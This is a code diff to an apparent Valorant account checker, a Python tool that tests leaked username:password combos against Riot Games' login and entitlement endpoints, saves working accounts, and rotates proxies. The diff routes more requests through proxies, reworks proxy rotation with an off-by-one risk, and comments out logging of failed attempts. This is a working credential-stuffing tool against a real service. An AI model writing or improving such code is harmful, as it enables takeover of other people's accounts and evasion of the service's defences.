@@ -57,6 +57,7 @@ class valorant:
         self._70_79 = 0
         self._80plus = 0
         self.proxies = []
+        self.proxy_counter = 0
 
     def change_title(self, arg):
         ctypes.windll.kernel32.SetConsoleTitleW(arg)
@@ -182,7 +183,7 @@ class valorant:
             r = session.post(f'https://auth.riotgames.com/api/v1/authorization', json=data, headers=headers, proxies=proxies)
         except Exception as e:
             self.connection_errors += 1
-            self.log(f"check_account()\nAccount: {combo}\nError: {e}\nProxy: {proxy}\nEndpoint: POST https://auth.riotgames.com/api/v1/authorization")
+            #self.log(f"check_account()\nAccount: {combo}\nError: {e}\nProxy: {proxy}\nEndpoint: POST https://auth.riotgames.com/api/v1/authorization")
             self.failed_accounts.append(combo)
             self.update_title()
             return
@@ -196,7 +197,7 @@ class valorant:
         except Exception as e:
             self.connection_errors += 1
             self.failed_accounts.append(combo)
-            self.log(f"check_account()\nAccount: {combo}\nError: {e}\nProxy: {proxy}\nEndpoint: PUT https://auth.riotgames.com/api/v1/authorization")
+            #self.log(f"check_account()\nAccount: {combo}\nError: {e}\nProxy: {proxy}\nEndpoint: PUT https://auth.riotgames.com/api/v1/authorization")
             self.update_title()
             return
         if "You do not have access to auth.riotgames.com" in login.text:
@@ -211,7 +212,7 @@ class valorant:
             with open(f"Results/{self.dt_string}/No Capture Valid.txt", "a") as f:
                 f.write(combo + "\n")
             self.update_title()
-            token = self.get_entitlement_token(access_token, session)
+            token = self.get_entitlement_token(access_token, session, proxies)
             if token == None:
                 return
             self.current_combo = combo
@@ -349,12 +350,18 @@ class valorant:
             self.radiant += 1
         self.update_title()
         
-    def get_entitlement_token(self, token, session):
+    def get_entitlement_token(self, token, session, proxies):
         headers = {
             "User-Agent": "RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)",
             "Authorization": f"Bearer " + token,
         }
-        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", headers = headers, json = {})
+        try:
+            r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", headers = headers, json = {}, proxies = proxies)
+        except:
+            self.connection_errors += 1
+            self.update_title()
+            self.failed_accounts.append(self.current_combo)
+            return None
         if "entitlements_token" in r.text:
             token = r.json()["entitlements_token"]
             return token
@@ -510,26 +517,24 @@ class valorant:
     def start_checking(self):
         try:
             self.create_folders()
-            proxy_counter = 0
             def check(account):
+                
                 if self.proxyless:
                     self.check_account(account)
                 else:
-                    self.check_account(account, self.proxies[proxy_counter])
+                    self.proxy_counter += 1
+                    proxy = self.proxies[self.proxy_counter]
+                    self.check_account(account, proxy)
+                    if len(self.proxies) <= self.proxy_counter:
+                        self.proxy_counter = 0
             for account in self.combos:
                 check(account)
-                proxy_counter += 1
-                if proxy_counter <= len(self.proxies):
-                    proxy_counter = 0
-            proxy_counter = 0
+            self.proxy_counter = 0
             while True:
                 if not len(self.failed_accounts):
                     break
                 for account in self.failed_accounts:
                     check(account)
-                    proxy_counter += 1
-                    if proxy_counter <= len(self.proxies):
-                        proxy_counter = 0
         except Exception as e:
             print(f"\n{white}     [{Fore.RED}!{Fore.WHITE}] An error has occurred, please view log file.")
             self.log(f"start_checking()\nError: {e}")
